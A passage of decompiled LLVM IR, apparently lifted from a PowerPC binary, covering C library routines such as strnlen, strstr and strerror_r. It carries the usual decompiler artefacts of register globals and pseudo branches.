  store i32 %v3_10009fac, i32* %r11.global-to-local, align 4
  %v0_10009fb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009fb0 = add i32 %v0_10009fb0, -1
  store i32 %v1_10009fb0, i32* %ctr.global-to-local, align 4
  %v2_10009fb0 = icmp eq i32 %v1_10009fb0, 0
  br i1 %v2_10009fb0, label %dec_label_pc_10009fc8, label %dec_label_pc_10009fb4

dec_label_pc_10009fb4:                            ; preds = %dec_label_pc_10009f9c
  %v0_10009fb4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009fb4, label %dec_label_pc_10009fb8, label %dec_label_pc_10009fb4.dec_label_pc_10009f9c_crit_edge

dec_label_pc_10009fb4.dec_label_pc_10009f9c_crit_edge: ; preds = %dec_label_pc_10009fb4
  %v0_10009fa0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009f9c

dec_label_pc_10009fb8:                            ; preds = %dec_label_pc_10009fb4, %dec_label_pc_10009f7c
  %v2_10009fc0.pre = phi i32 [ %v2_10009fc0.pre.pre, %dec_label_pc_10009f7c ], [ %v3_10009fac, %dec_label_pc_10009fb4 ]
  %v0_10009fb8 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_10009fb8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009fbc

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009fbc, %dec_label_pc_10009fb8
  %v2_10009fc0 = phi i32 [ %v3_10009fc0, %dec_label_pc_10009fbc ], [ %v2_10009fc0.pre, %dec_label_pc_10009fb8 ]
  %v3_10009fc0 = add i32 %v2_10009fc0, 1
  %v4_10009fc0 = inttoptr i32 %v3_10009fc0 to i8*
  store i8 0, i8* %v4_10009fc0, align 1
  store i32 %v3_10009fc0, i32* %r11.global-to-local, align 4
  %v0_10009fc4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009fc4 = add i32 %v0_10009fc4, -1
  store i32 %v1_10009fc4, i32* %ctr.global-to-local, align 4
  %v2_10009fc4 = icmp eq i32 %v1_10009fc4, 0
  br i1 %v2_10009fc4, label %dec_label_pc_10009fc8, label %dec_label_pc_10009fbc

dec_label_pc_10009fc8:                            ; preds = %dec_label_pc_10009f9c, %dec_label_pc_10009fbc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10009fc4, { 1, 0 }
  uselistorder i32 %v3_10009fc0, { 1, 2, 0 }
  uselistorder i32 %v1_10009fb0, { 1, 0 }
  uselistorder i32 %v3_10009fac, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10009f90, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10009f74, { 1, 0 }
  uselistorder i32 %v3_10009f6c, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009fc8, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10009fcc = load i32, i32* @r4, align 4
  %v3_10009fcc = icmp eq i32 %v0_10009fcc, 0
  %v0_10009fd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009fcc, i32 %v0_10009fd8)
  %v1_10009fe8 = load i32, i32* @r4, align 4
  %v2_10009fe8 = add i32 %v1_10009fe8, %tmp
  %v3_10009fec = icmp ugt i32 %v2_10009fe8, %tmp
  %v4_10009fec = icmp eq i32 %v1_10009fe8, 0
  %v2_10009ff0 = or i1 %v4_10009fec, %v3_10009fec
  br i1 %v2_10009ff0, label %dec_label_pc_10009ff8, label %dec_label_pc_10009ff4

dec_label_pc_10009fe0:                            ; preds = %dec_label_pc_1000a060
  br label %dec_label_pc_1000a0a4

dec_label_pc_10009ff4:                            ; preds = %entry
  br label %dec_label_pc_10009ff8

dec_label_pc_10009ff8:                            ; preds = %entry, %dec_label_pc_10009ff4
  %v0_1000a0a8 = phi i32 [ %v2_10009fe8, %entry ], [ -1, %dec_label_pc_10009ff4 ]
  %v1_1000a0286 = urem i32 %tmp, 4
  %v3_1000a0288 = icmp eq i32 %v1_1000a0286, 0
  br i1 %v3_1000a0288, label %dec_label_pc_1000a030, label %dec_label_pc_1000a000

dec_label_pc_1000a000:                            ; preds = %dec_label_pc_10009ff8, %dec_label_pc_1000a024
  %v0_1000a018 = phi i32 [ %v1_1000a024, %dec_label_pc_1000a024 ], [ %tmp, %dec_label_pc_10009ff8 ]
  %v1_1000a000 = inttoptr i32 %v0_1000a018 to i8*
  %v2_1000a000 = load i8, i8* %v1_1000a000, align 1
  %v3_1000a004 = icmp eq i8 %v2_1000a000, 0
  br i1 %v3_1000a004, label %dec_label_pc_1000a00c, label %dec_label_pc_1000a024

dec_label_pc_1000a00c:                            ; preds = %dec_label_pc_1000a000
  %v3_1000a00c = icmp ugt i32 %v0_1000a0a8, %v0_1000a018
  %v0_1000a018.v0_1000a0a8 = select i1 %v3_1000a00c, i32 %v0_1000a018, i32 %v0_1000a0a8
  %v2_1000a01c = sub i32 %v0_1000a018.v0_1000a0a8, %tmp
  ret i32 %v2_1000a01c

dec_label_pc_1000a024:                            ; preds = %dec_label_pc_1000a000
  %v1_1000a024 = add i32 %v0_1000a018, 1
  %v1_1000a028 = urem i32 %v1_1000a024, 4
  %v3_1000a028 = icmp eq i32 %v1_1000a028, 0
  br i1 %v3_1000a028, label %dec_label_pc_1000a030, label %dec_label_pc_1000a000

dec_label_pc_1000a030:                            ; preds = %dec_label_pc_1000a024, %dec_label_pc_10009ff8
  %v0_1000a034 = phi i32 [ %tmp, %dec_label_pc_10009ff8 ], [ %v1_1000a024, %dec_label_pc_1000a024 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000a09c3 = icmp ult i32 %v0_1000a034, %v0_1000a0a8
  br i1 %v2_1000a09c3, label %dec_label_pc_1000a040, label %dec_label_pc_1000a0a4

dec_label_pc_1000a040:                            ; preds = %dec_label_pc_1000a030, %dec_label_pc_1000a098
  %v0_10009fe0 = phi i32 [ %v1_1000a044, %dec_label_pc_1000a098 ], [ %v0_1000a034, %dec_label_pc_1000a030 ]
  %v1_1000a040 = inttoptr i32 %v0_10009fe0 to i32*
  %v2_1000a040 = load i32, i32* %v1_1000a040, align 4
  %v1_1000a044 = add i32 %v0_10009fe0, 4
  store i32 %v0_10009fe0, i32* @r8, align 4
  %v1_1000a050 = add i32 %v2_1000a040, -16843009
  %v2_1000a054 = and i32 %v1_1000a050, -2139062144
  %v5_1000a054 = icmp eq i32 %v2_1000a054, 0
  %v1_1000a058 = add i32 %v0_10009fe0, 1
  br i1 %v5_1000a054, label %dec_label_pc_1000a098, label %dec_label_pc_1000a060

dec_label_pc_1000a060:                            ; preds = %dec_label_pc_1000a040
  %v2_1000a060 = inttoptr i32 %v0_10009fe0 to i8*
  %v3_1000a060 = load i8, i8* %v2_1000a060, align 1
  %v3_1000a064 = icmp eq i8 %v3_1000a060, 0
  br i1 %v3_1000a064, label %dec_label_pc_10009fe0, label %dec_label_pc_1000a06c

dec_label_pc_1000a06c:                            ; preds = %dec_label_pc_1000a060
  %v2_1000a06c = inttoptr i32 %v1_1000a058 to i8*
  %v3_1000a06c = load i8, i8* %v2_1000a06c, align 1
  %v3_1000a070 = icmp eq i8 %v3_1000a06c, 0
  br i1 %v3_1000a070, label %dec_label_pc_1000a0a4, label %dec_label_pc_1000a078

dec_label_pc_1000a078:                            ; preds = %dec_label_pc_1000a06c
  %v1_1000a078 = add i32 %v0_10009fe0, 2
  %v2_1000a078 = inttoptr i32 %v1_1000a078 to i8*
  %v3_1000a078 = load i8, i8* %v2_1000a078, align 1
  %v3_1000a080 = icmp eq i8 %v3_1000a078, 0
  br i1 %v3_1000a080, label %dec_label_pc_1000a0a4, label %dec_label_pc_1000a088

dec_label_pc_1000a088:                            ; preds = %dec_label_pc_1000a078
  %v1_1000a088 = add i32 %v0_10009fe0, 3
  %v2_1000a088 = inttoptr i32 %v1_1000a088 to i8*
  %v3_1000a088 = load i8, i8* %v2_1000a088, align 1
  %v3_1000a090 = icmp eq i8 %v3_1000a088, 0
  br i1 %v3_1000a090, label %dec_label_pc_1000a0a4, label %dec_label_pc_1000a098

dec_label_pc_1000a098:                            ; preds = %dec_label_pc_1000a088, %dec_label_pc_1000a040
  %v2_1000a09c = icmp ult i32 %v1_1000a044, %v0_1000a0a8
  br i1 %v2_1000a09c, label %dec_label_pc_1000a040, label %dec_label_pc_1000a0a4

dec_label_pc_1000a0a4:                            ; preds = %dec_label_pc_1000a098, %dec_label_pc_1000a06c, %dec_label_pc_1000a078, %dec_label_pc_1000a088, %dec_label_pc_1000a030, %dec_label_pc_10009fe0
  %v0_1000a0b0 = phi i32 [ %v0_10009fe0, %dec_label_pc_10009fe0 ], [ %v0_1000a034, %dec_label_pc_1000a030 ], [ %v1_1000a088, %dec_label_pc_1000a088 ], [ %v1_1000a078, %dec_label_pc_1000a078 ], [ %v1_1000a058, %dec_label_pc_1000a06c ], [ %v0_1000a0a8, %dec_label_pc_1000a098 ]
  %v3_1000a0a4 = icmp ugt i32 %v0_1000a0a8, %v0_1000a0b0
  %v0_1000a0b0.v0_1000a0a8 = select i1 %v3_1000a0a4, i32 %v0_1000a0b0, i32 %v0_1000a0a8
  %v2_1000a0b4 = sub i32 %v0_1000a0b0.v0_1000a0a8, %tmp
  ret i32 %v2_1000a0b4

; uselistorder directives
  uselistorder i32 %v1_1000a044, { 1, 0 }
  uselistorder i32 %v0_10009fe0, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000a034, { 1, 0, 2 }
  uselistorder i32 %v1_1000a024, { 1, 0, 2 }
  uselistorder i32 %v0_1000a018, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a0a8, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_10009fe8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000a0a4, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000a040, { 1, 0 }
  uselistorder label %dec_label_pc_1000a000, { 1, 0 }
  uselistorder label %dec_label_pc_10009ff8, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000a0bc = load i8, i8* %arg2, align 1
  %v4_1000a0bc = zext i8 %v3_1000a0bc to i32
  store i32 %v4_1000a0bc, i32* %r6.global-to-local, align 4
  %v3_1000a0c0 = icmp eq i8 %v3_1000a0bc, 0
  %v0_1000a0c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a0c0, i32 %v0_1000a0c4)
  %v1_1000a0c8 = add i32 %arg1, -1
  store i32 %v1_1000a0c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a0cc

dec_label_pc_1000a0cc:                            ; preds = %dec_label_pc_1000a0dc, %entry
  %v0_1000a0cc = phi i32 [ %v1_1000a0cc, %dec_label_pc_1000a0dc ], [ %v1_1000a0c8, %entry ]
  %v1_1000a0cc = add i32 %v0_1000a0cc, 1
  %v2_1000a0cc = inttoptr i32 %v1_1000a0cc to i8*
  %v3_1000a0cc = load i8, i8* %v2_1000a0cc, align 1
  store i32 %v1_1000a0cc, i32* %r3.global-to-local, align 4
  %v3_1000a0d0 = icmp eq i8 %v3_1000a0cc, 0
  br i1 %v3_1000a0d0, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a0dc

dec_label_pc_1000a0dc:                            ; preds = %dec_label_pc_1000a0cc
  %v4_1000a0d4 = icmp eq i8 %v3_1000a0cc, %v3_1000a0bc
  br i1 %v4_1000a0d4, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a0cc

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a0dc
  %v2_1000a0e0 = add i32 %tmp, 1
  %v3_1000a0e0 = inttoptr i32 %v2_1000a0e0 to i8*
  %v4_1000a0e0 = load i8, i8* %v3_1000a0e0, align 1
  %v5_1000a0e0 = zext i8 %v4_1000a0e0 to i32
  store i32 %v5_1000a0e0, i32* %r5.global-to-local, align 4
  store i32 %v2_1000a0e0, i32* %r4.global-to-local, align 4
  %v3_1000a0e8 = icmp eq i8 %v4_1000a0e0, 0
  %v0_1000a0ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a0e8, i32 %v0_1000a0ec)
  %v0_1000a0f0.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a134

dec_label_pc_1000a0fc:                            ; preds = %dec_label_pc_1000a19c
  %v3_1000a0fc = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000a0fc = zext i8 %v3_1000a0fc to i32
  store i32 %v1_1000a0f0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a124.preheader

dec_label_pc_1000a124.preheader:                  ; preds = %dec_label_pc_1000a0fc, %dec_label_pc_1000a134
  %v0_1000a12417 = phi i32 [ %v4_1000a0fc, %dec_label_pc_1000a0fc ], [ %storemerge4, %dec_label_pc_1000a134 ]
  %v1_1000a124.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000a12425 = icmp eq i32 %v0_1000a12417, %v1_1000a124.pre
  %v3_1000a12827 = icmp eq i32 %v0_1000a12417, 0
  br i1 %v4_1000a12425, label %dec_label_pc_1000a134, label %dec_label_pc_1000a108

dec_label_pc_1000a108:                            ; preds = %dec_label_pc_1000a124.preheader, %dec_label_pc_1000a120
  %v3_1000a12829 = phi i1 [ %v3_1000a128, %dec_label_pc_1000a120 ], [ %v3_1000a12827, %dec_label_pc_1000a124.preheader ]
  %v0_1000a10c28 = phi i32 [ %v1_1000a120, %dec_label_pc_1000a120 ], [ %v1_1000a0f0, %dec_label_pc_1000a124.preheader ]
  br i1 %v3_1000a12829, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a10c

dec_label_pc_1000a10c:                            ; preds = %dec_label_pc_1000a108
  %v1_1000a10c = add i32 %v0_1000a10c28, 1
  %v2_1000a10c = inttoptr i32 %v1_1000a10c to i8*
  %v3_1000a10c = load i8, i8* %v2_1000a10c, align 1
  %v4_1000a10c = zext i8 %v3_1000a10c to i32
  store i32 %v1_1000a10c, i32* %r11.global-to-local, align 4
  %v4_1000a110 = icmp eq i32 %v4_1000a10c, %v1_1000a124.pre
  br i1 %v4_1000a110, label %dec_label_pc_1000a134, label %dec_label_pc_1000a11c

dec_label_pc_1000a11c:                            ; preds = %dec_label_pc_1000a10c
  %v3_1000a114 = icmp eq i8 %v3_1000a10c, 0
  br i1 %v3_1000a114, label %dec_label_pc_1000a1a8, label %dec_label_pc_1000a120

dec_label_pc_1000a120:                            ; preds = %dec_label_pc_1000a11c
  %v1_1000a120 = add i32 %v0_1000a10c28, 2
  %v2_1000a120 = inttoptr i32 %v1_1000a120 to i8*
  %v3_1000a120 = load i8, i8* %v2_1000a120, align 1
  %v4_1000a120 = zext i8 %v3_1000a120 to i32
  store i32 %v1_1000a120, i32* %r11.global-to-local, align 4
  %v4_1000a124 = icmp eq i32 %v4_1000a120, %v1_1000a124.pre
  %v3_1000a128 = icmp eq i8 %v3_1000a120, 0
  br i1 %v4_1000a124, label %dec_label_pc_1000a134, label %dec_label_pc_1000a108

dec_label_pc_1000a134:                            ; preds = %dec_label_pc_1000a124.preheader, %dec_label_pc_1000a120, %dec_label_pc_1000a10c, %dec_label_pc_1000a0e0
  %v0_1000a0f0.sink = phi i32 [ %v0_1000a0f0.sink.pre, %dec_label_pc_1000a0e0 ], [ %v1_1000a0f0, %dec_label_pc_1000a124.preheader ], [ %v1_1000a120, %dec_label_pc_1000a120 ], [ %v1_1000a10c, %dec_label_pc_1000a10c ]
  %v1_1000a0f0 = add i32 %v0_1000a0f0.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000a0f0 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000a0f0, i32* %r11.global-to-local, align 4
  %v1_1000a134 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000a134 = icmp eq i32 %storemerge4, %v1_1000a134
  br i1 %v4_1000a134, label %dec_label_pc_1000a13c, label %dec_label_pc_1000a124.preheader

dec_label_pc_1000a13c:                            ; preds = %dec_label_pc_1000a134
  %v1_1000a13c = add i32 %v0_1000a0f0.sink, 2
  %v2_1000a13c = inttoptr i32 %v1_1000a13c to i8*
  %v3_1000a13c = load i8, i8* %v2_1000a13c, align 1
  %v4_1000a13c = zext i8 %v3_1000a13c to i32
  store i32 %v4_1000a13c, i32* %r10.global-to-local, align 4
  store i32 %v0_1000a0f0.sink, i32* %r3.global-to-local, align 4
  %v0_1000a144 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a144 = add i32 %v0_1000a144, 1
  %v2_1000a144 = inttoptr i32 %v1_1000a144 to i8*
  %v3_1000a144 = load i8, i8* %v2_1000a144, align 1
  %v4_1000a144 = zext i8 %v3_1000a144 to i32
  store i32 %v1_1000a144, i32* %r8.global-to-local, align 4
  store i32 %v1_1000a13c, i32* %r11.global-to-local, align 4
  %v4_1000a150 = icmp eq i8 %v3_1000a13c, %v3_1000a144
  br i1 %v4_1000a150, label %dec_label_pc_1000a158, label %dec_label_pc_1000a19c

dec_label_pc_1000a158:                            ; preds = %dec_label_pc_1000a13c, %dec_label_pc_1000a184.dec_label_pc_1000a158_crit_edge
  %v0_1000a160 = phi i32 [ %v0_1000a160.pre, %dec_label_pc_1000a184.dec_label_pc_1000a158_crit_edge ], [ %v1_1000a144, %dec_label_pc_1000a13c ]
  %v0_1000a15c = phi i32 [ %v0_1000a15c.pre, %dec_label_pc_1000a184.dec_label_pc_1000a158_crit_edge ], [ %v1_1000a13c, %dec_label_pc_1000a13c ]
  %v0_1000a158 = phi i32 [ %v4_1000a188, %dec_label_pc_1000a184.dec_label_pc_1000a158_crit_edge ], [ %v4_1000a13c, %dec_label_pc_1000a13c ]
  %v3_1000a158 = icmp eq i32 %v0_1000a158, 0
  %v1_1000a15c = add i32 %v0_1000a15c, 1
  store i32 %v1_1000a15c, i32* %r7.global-to-local, align 4
  %v1_1000a160 = add i32 %v0_1000a160, 1
  store i32 %v1_1000a160, i32* %r10.global-to-local, align 4
  %v0_1000a164 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a158, i32 %v0_1000a164)
  %v0_1000a168 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a168 = add i32 %v0_1000a168, 1
  %v2_1000a168 = inttoptr i32 %v1_1000a168 to i8*
  %v3_1000a168 = load i8, i8* %v2_1000a168, align 1
  %v4_1000a168 = zext i8 %v3_1000a168 to i32
  %v0_1000a16c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a16c = add i32 %v0_1000a16c, 1
  store i32 %v1_1000a16c, i32* %r8.global-to-local, align 4
  %v0_1000a170 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a170 = add i32 %v0_1000a170, 1
  %v2_1000a170 = inttoptr i32 %v1_1000a170 to i8*
  %v3_1000a170 = load i8, i8* %v2_1000a170, align 1
  %v0_1000a174 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a174 = add i32 %v0_1000a174, 1
  store i32 %v1_1000a174, i32* %r11.global-to-local, align 4
  %v4_1000a17c = icmp eq i8 %v3_1000a170, %v3_1000a168
  br i1 %v4_1000a17c, label %dec_label_pc_1000a184, label %dec_label_pc_1000a19c

dec_label_pc_1000a184:                            ; preds = %dec_label_pc_1000a158
  %v3_1000a178 = icmp eq i8 %v3_1000a168, 0
  %v0_1000a184 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a178, i32 %v0_1000a184)
  %v0_1000a188 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a188 = add i32 %v0_1000a188, 1
  %v2_1000a188 = inttoptr i32 %v1_1000a188 to i8*
  %v3_1000a188 = load i8, i8* %v2_1000a188, align 1
  %v4_1000a188 = zext i8 %v3_1000a188 to i32
  %v0_1000a18c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a18c = add i32 %v0_1000a18c, 1
  %v2_1000a18c = inttoptr i32 %v1_1000a18c to i8*
  %v3_1000a18c = load i8, i8* %v2_1000a18c, align 1
  store i32 %v4_1000a188, i32* %r10.global-to-local, align 4
  %v4_1000a194 = icmp eq i8 %v3_1000a18c, %v3_1000a188
  br i1 %v4_1000a194, label %dec_label_pc_1000a184.dec_label_pc_1000a158_crit_edge, label %dec_label_pc_1000a19c

dec_label_pc_1000a184.dec_label_pc_1000a158_crit_edge: ; preds = %dec_label_pc_1000a184
  %v0_1000a15c.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a160.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a158

dec_label_pc_1000a19c:                            ; preds = %dec_label_pc_1000a184, %dec_label_pc_1000a158, %dec_label_pc_1000a13c
  %v0_1000a19c = phi i32 [ %v4_1000a144, %dec_label_pc_1000a13c ], [ %v4_1000a188, %dec_label_pc_1000a184 ], [ %v4_1000a168, %dec_label_pc_1000a158 ]
  %v3_1000a19c = icmp eq i32 %v0_1000a19c, 0
  br i1 %v3_1000a19c, label %dec_label_pc_1000a1a4, label %dec_label_pc_1000a0fc

dec_label_pc_1000a1a4:                            ; preds = %dec_label_pc_1000a19c
  ret i32 %v0_1000a0f0.sink

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a0cc, %dec_label_pc_1000a11c, %dec_label_pc_1000a108
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1000a188, { 0, 2, 1 }
  uselistorder i8 %v3_1000a168, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1000a0f0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1000a0f0.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a120, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a10c28, { 1, 0 }
  uselistorder i32 %v1_1000a124.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1000a0cc, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000a1a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a158, { 1, 0 }
  uselistorder label %dec_label_pc_1000a134, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000a108, { 1, 0 }
  uselistorder label %dec_label_pc_1000a124.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268476872, i32* @lr, align 4
  %v0_1000a1c4 = call i32 @__xpg_strerror_r()
  %v0_1000a1cc = load i32, i32* @r29, align 4
  ret i32 %v0_1000a1cc
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1000a1e0 = load i32, i32* @r3, align 4
  %v2_1000a1e0 = icmp ugt i32 %v0_1000a1e0, 124
  %v0_1000a1f0 = load i32, i32* @r4, align 4
  store i32 %v0_1000a1f0, i32* %r27.global-to-local, align 4
  %v0_1000a1f8 = load i32, i32* @r5, align 4
  br i1 %v2_1000a1e0, label %dec_label_pc_1000a23c, label %dec_label_pc_1000a200

dec_label_pc_1000a200:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_10011be0.313 to i32), i32* %r30.global-to-local, align 4
  %v3_1000a21c7 = icmp eq i32 %v0_1000a1e0, 0
  br i1 %v3_1000a21c7, label %dec_label_pc_1000a230, label %dec_label_pc_1000a210

dec_label_pc_1000a210:                            ; preds = %dec_label_pc_1000a200, %dec_label_pc_1000a210
  %v0_1000a214 = phi i32 [ %v1_1000a214, %dec_label_pc_1000a210 ], [ ptrtoint ([8 x i8]* @global_var_10011be0.313 to i32), %dec_label_pc_1000a200 ]
  %v1_1000a214 = add i32 %v0_1000a214, 1
  store i32 %v1_1000a214, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a210

dec_label_pc_1000a230:                            ; preds = %dec_label_pc_1000a200
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a270

dec_label_pc_1000a23c:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1000a1e0, 0
  %v1_1000a240 = zext i1 %tmp to i32
  %v2_1000a240 = ashr i32 %v0_1000a1e0, 31
  %v3_1000a240 = and i32 %v2_1000a240, -2
  %v4_1000a240 = or i32 %v3_1000a240, %v1_1000a240
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1000a254 = bitcast i32* %stack_var_-39 to i8*
  %v6_1000a254 = call i32 @_uintmaxtostr(i8* %v5_1000a254, i32 %v4_1000a240, i32 %v0_1000a1e0, i32 -10, i32 0)
  %v1_1000a25c = add i32 %v6_1000a254, -14
  store i32 %v1_1000a25c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_10011bd0.314 to i32), i32* @r4, align 4
  store i32 %v1_1000a25c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268477040, i32* @lr, align 4
  %v0_1000a26c = call i32 @memcpy()
  %v0_1000a270.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1000a274.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000a284.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000a270

dec_label_pc_1000a270:                            ; preds = %dec_label_pc_1000a230, %dec_label_pc_1000a23c
  %v0_1000a284 = phi i32 [ %v0_1000a1f8, %dec_label_pc_1000a230 ], [ %v0_1000a284.pre, %dec_label_pc_1000a23c ]
  %v0_1000a274 = phi i32 [ ptrtoint ([8 x i8]* @global_var_10011be0.313 to i32), %dec_label_pc_1000a230 ], [ %v0_1000a274.pre, %dec_label_pc_1000a23c ]
  %v1_1000a278 = phi i32 [ %v0_1000a1f0, %dec_label_pc_1000a230 ], [ %v0_1000a270.pre, %dec_label_pc_1000a23c ]
  %tmp19 = icmp slt i32 %v1_1000a278, 0
  %v1_1000a270 = zext i1 %tmp19 to i32
  %v2_1000a270 = ashr i32 %v1_1000a278, 31
  %v3_1000a270 = and i32 %v2_1000a270, -2
  %v4_1000a270 = or i32 %v3_1000a270, %v1_1000a270
  store i32 %v0_1000a274, i32* @r3, align 4
  %v2_1000a278 = xor i32 %v4_1000a270, %v1_1000a278
  %v2_1000a27c = sub i32 %v4_1000a270, %v2_1000a278
  %tmp20 = icmp slt i32 %v2_1000a27c, 0
  %v1_1000a280 = zext i1 %tmp20 to i32
  %v2_1000a280 = ashr i32 %v2_1000a27c, 31
  %v3_1000a280 = and i32 %v2_1000a280, -2
  %v4_1000a280 = or i32 %v3_1000a280, %v1_1000a280
  %v2_1000a284 = and i32 %v4_1000a280, %v0_1000a284
  store i32 %v2_1000a284, i32* @r29, align 4
  %v0_1000a288 = call i32 @__GI_strlen()
  %v1_1000a28c = add i32 %v0_1000a288, 1
  store i32 %v1_1000a28c, i32* %r31.global-to-local, align 4
  %v1_1000a290 = load i32, i32* @r29, align 4
  %v3_1000a290 = icmp ugt i32 %v1_1000a28c, %v1_1000a290
  br i1 %v3_1000a290, label %dec_label_pc_1000a298, label %dec_label_pc_1000a2a0

dec_label_pc_1000a298:                            ; preds = %dec_label_pc_1000a270
  store i32 %v1_1000a290, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a2a0

dec_label_pc_1000a2a0:                            ; preds = %dec_label_pc_1000a270, %dec_label_pc_1000a298
  %v0_1000a2b0 = phi i32 [ %v1_1000a290, %dec_label_pc_1000a298 ], [ %v1_1000a28c, %dec_label_pc_1000a270 ]
  %v3_1000a2a0 = icmp eq i32 %v0_1000a2b0, 0
  br i1 %v3_1000a2a0, label %dec_label_pc_1000a2c4, label %dec_label_pc_1000a2a8

dec_label_pc_1000a2a8:                            ; preds = %dec_label_pc_1000a2a0
  %v0_1000a2a8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000a2a8, i32* @r4, align 4
  %v0_1000a2ac = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000a2ac, i32* @r3, align 4
  store i32 %v0_1000a2b0, i32* @r5, align 4
  store i32 268477112, i32* @lr, align 4
  %v0_1000a2b4 = call i32 @memcpy()
